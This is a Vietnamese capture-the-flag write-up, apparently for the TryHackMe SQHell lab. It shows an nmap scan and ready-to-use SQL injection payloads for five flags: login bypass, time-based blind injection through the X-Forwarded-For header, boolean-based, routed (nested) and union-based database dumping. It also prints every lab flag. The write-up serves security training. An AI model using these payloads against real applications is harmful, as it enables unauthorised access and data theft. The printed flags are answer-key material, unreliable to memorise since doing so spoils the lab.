Đầu tiên ta sẽ dò quét cơ bản bằng `nmap`
```
nmap -sC -sV 10.48.141.66
```
Từ đó ta được 
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 02:55 EDT
Nmap scan report for 10.48.141.66
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a9:3f:6d:fc:62:7a:fb:01:e6:ef:53:41:44:11:d8:90 (RSA)
|   256 f7:46:51:83:e3:74:a2:70:fb:02:17:76:a1:c7:90:c2 (ECDSA)
|_  256 7d:6e:7f:df:97:2d:8b:0b:09:5b:90:82:a1:05:e9:31 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
```
Truy cập vào địa chỉ `10.48.141.66` bằng trình duyệt 


<img width="1913" height="859" alt="image" src="https://github.com/user-attachments/assets/4878ff0e-7ec2-401d-a712-9cf01746de06" />
Flag 1 - Authentication Bypass SQLi
Đây là dạng SQL Injection kinh điển và phổ biến nhất, xuất hiện ngay tại form đăng nhập 

Chúng ta có thể dễ dàng vượt qua cơ chế xác thực bằng cách chèn câu lệnh logic luôn đúng vào trường username:

Username: `admin' or 1=1-- -`

Password: Nhập bất kỳ ký tự nào

Sau khi bấm đăng nhập, hệ thống sẽ bị bypass thành công và hiển thị Flag 1.
```
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
```
Flag 2: Time-based SQL Injection via X-Forwarded-For Header

Khi kiểm tra các request gửi lên server, chúng ta nhận thấy ứng dụng có ghi nhận thông tin địa chỉ IP của người dùng thông qua HTTP Header X-Forwarded-For.

Thông thường, cấu hình này được dùng để định danh client khi đi qua Reverse Proxy. Nếu ứng dụng sử dụng giá trị này để chèn trực tiếp vào câu lệnh SQL (ví dụ: Lưu log truy cập, kiểm tra giới hạn request) mà không qua cơ chế lọc (sanitization), nó sẽ dẫn đến lỗ hổng SQL Injection.
Để kiểm tra ứng dụng có bị tổn thương bởi SQLi tại đây hay không, chúng ta tiến hành chèn thêm Header X-Forwarded-For vào HTTP Request và thực hiện kỹ thuật Time-based Blind SQL Injection.

Sử dụng câu lệnh sleep(2) để ép hệ quản trị cơ sở dữ liệu tạm dừng trong 2 giây. Nếu thời gian phản hồi (Response Time) của server bị trễ đúng bằng hoặc lớn hơn 2 giây, chứng tỏ câu lệnh SQL đã được thực thi thành công.
```
GET / HTTP/1.1
Host: sqhell.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,xml;q=0.9,image/avif,image/webp,*/*;q=0.8
X-Forwarded-For: 127.0.0.1' union select 1,sleep(2),3 -- -
Connection: close
```
Server phản hồi về với độ trễ chính xác khoảng ~2 giây. Điều này xác nhận lỗ hổng tồn tại. Từ điểm neo này, ta có thể tiếp tục khai thác bằng script Python hoặc SQLmap để dump cơ sở dữ liệu và lấy ra Flag 2.Ví dụ như:

`127.0.0.1' union select 1,if(database() LIKE 'a%',sleep(2),3),3 -- -`

`127.0.0.1' union select 1,if((select table_name from information_schema.tables where table_schema='sqhell' limit 0,1) LIKE 'f%',sleep(2),3),3 -- -`

`127.0.0.1' union select 1,if((select column_name from information_schema.columns where table_name='flags' limit 0,1) LIKE 'f%',sleep(2),3),3 -- -`

`127.0.0.1' union select 1,if((select flag from flags limit 0,1) LIKE 'THM{%',sleep(2),3),3 -- -`


`THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}`

Flag 3: Boolean-based SQL Injection via Register Function

Tại chức năng Đăng ký (Register) của ứng dụng, hệ thống cung cấp một cơ chế kiểm tra thời gian thực (Real-time check) xem tên người dùng (username) đã được đăng ký trước đó hay chưa.Khi tương tác và bắt gói tin bằng Burp Suite, chúng ta xác định được logic phản hồi chuẩn của hệ thống như sau:Username CHƯA tồn tại: Hệ thống báo danh tính này sẵn sàng để đăng ký $\rightarrow$ Trả về {"available": true}.Username ĐÃ tồn tại (Ví dụ: admin): Hệ thống báo trùng dữ liệu $\rightarrow$ Trả về {"available": false}.

<img width="1902" height="832" alt="image" src="https://github.com/user-attachments/assets/229ffe17-8f45-4e79-90be-208735f03043" />

Ta sẽ dùng các payload sau để tìm ra flag

```
admin' AND database() LIKE 's%' -- -
```

```
admin' AND (select table_name from information_schema.tables where table_schema='sqhell_3' limit 0,1) LIKE 'f%' -- -
```

Tiếp tục cho đến khi tìm ra flag
```
THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
```

Flag 4: Routed SQL Injection (Nested / Inception SQLi)

Tại chức năng xem thông tin người dùng (/user?id=), chúng ta dễ dàng xác định được lỗ hổng Union-based SQL Injection cơ bản trên tham số id.

Tuy nhiên, khi thực hiện dump cấu trúc database sqhell_4 bằng kỹ thuật Union thông thường, chúng ta chỉ tìm thấy bảng users chứa tài khoản admin với mật khẩu mã hóa/thông thường, hoàn toàn không có bảng nào tên là flags hay chứa flag như các bài trước.
"Well, dreams, they feel real while we're in them right?" Đây là câu thoại nổi tiếng trong bộ phim Inception (Bộ phim về những giấc mơ lồng trong giấc mơ). Trong bảo mật web, điều này ám chỉ kỹ thuật Routed SQL Injection – câu lệnh SQL lồng trong câu lệnh SQL.
Cơ chế xử lý ẩn bên dưới của ứng dụng hoạt động qua 2 bước (Two-step query):Query 1: Ứng dụng nhận id từ người dùng $\rightarrow$ Thực thi câu lệnh để lấy ra thông tin cấu hình hoặc một ID nội bộ khác (Ví dụ: SELECT internal_id FROM users WHERE id = [INPUT]).Query 2: Ứng dụng lấy kết quả internal_id vừa tìm được ở Query 1, nối trực tiếp vào một câu lệnh truy vấn thứ hai để lấy dữ liệu cuối cùng hiển thị lên màn hình (Ví dụ: SELECT * FROM profiles WHERE profile_id = [KẾT QUẢ QUERY 1]).

Trước hết, ta dùng lệnh UNION ở Query 1 để xem các cột nào sẽ được trả về và đưa vào Query 2. Ta tiêm payload thử nghiệm sau vào tham số id:
```
2 union all select 'column1','column2','column3' -- -
```
<img width="1593" height="824" alt="image" src="https://github.com/user-attachments/assets/f3dfcd23-2f18-40e1-a791-69eaff795240" />

Bây giờ, thay vì trả về chữ 'column1' vô hại, ta sẽ bắt Cột số 1 trả về một chuỗi payload SQLi.

Giả sử qua thử nghiệm (hoặc phán đoán cấu trúc Query 2), ta biết Query 2 yêu cầu một câu lệnh Union gồm 4 cột. Ta thiết kế payload lồng nhau như sau:
```
2 union all select '123 UNION SELECT 5,6,7,8-- -','column2','column3' from users-- -
```
<img width="1597" height="830" alt="image" src="https://github.com/user-attachments/assets/98993196-1926-410f-9077-6ab0b826144f" />

Cơ chế hoạt động cực kỳ vi diệu ở đây:

Query 1 thực thi: Kết quả trả về tại Cột 1 là chuỗi chữ viết: 123 UNION SELECT 5,6,7,8-- -.

Ứng dụng xử lý: Nó lấy chuỗi này và nối thẳng vào Query 2.

Query 2 thực thi
Do cấu trúc chung của bài Lab SQHell luôn lưu flag ở bảng flag (hoặc flags) và cột tên là flag. Ta tiến hành sửa đổi câu lệnh SQL con nằm bên trong chuỗi string của Cột 1 để dump dữ liệu:

Payload hoàn chỉnh nhập vào Burp Suite:
```
2 union all select '123 UNION SELECT 5,flag,7,8 from flag-- -','column2','column3'-- -
```
<img width="1599" height="828" alt="image" src="https://github.com/user-attachments/assets/8c99c430-2825-464e-b48a-979d3b9497b2" />

`THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}`

Flag 5: In-band (Union-based) SQL Injection via Post Function

Tại chức năng xem bài viết (/post?id=), ứng dụng hiển thị nội dung chi tiết của một bài đăng dựa trên tham số id truyền vào qua phương thức GET.

Tiến hành kiểm tra phản hồi của ứng dụng với các giá trị đầu vào khác nhau:

Truy cập id=2: Hiển thị bài viết số 2 hợp lệ.

Truy cập id=42 (ID không tồn tại): Hệ thống trả về thông báo "Post not found".

Truy cập id=55 OR 1=1: Mệnh đề luôn đúng (1=1) làm thay đổi logic truy vấn, ép ứng dụng trả về bài viết đầu tiên tìm thấy thay vì báo lỗi không tồn tại ID 55.
Dấu hiệu trên xác nhận tham số id bị ảnh hưởng bởi lỗ hổng In-band SQL Injection. Ứng dụng nối trực tiếp dữ liệu đầu vào vào câu lệnh truy vấn và sẵn sàng hiển thị kết quả của câu lệnh đó ra màn hình.
Xác định số lượng cột và Vị trí hiển thị (Reflected Columns)
```
55 UNION SELECT 1,2,3,4-- -
```
Tiếp tục khai thác 
```
55 UNION SELECT 1,database(),version(),4-- -
```
```
55 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='sqhell_5'-- -
```

```
55 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='flag'-- -
```
```
55 UNION SELECT 1,flag,3,4 FROM flag -- -
```
<img width="1606" height="831" alt="image" src="https://github.com/user-attachments/assets/9cad4d2c-8e8c-4d92-b114-a42c47e9ca91" />

```
THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```










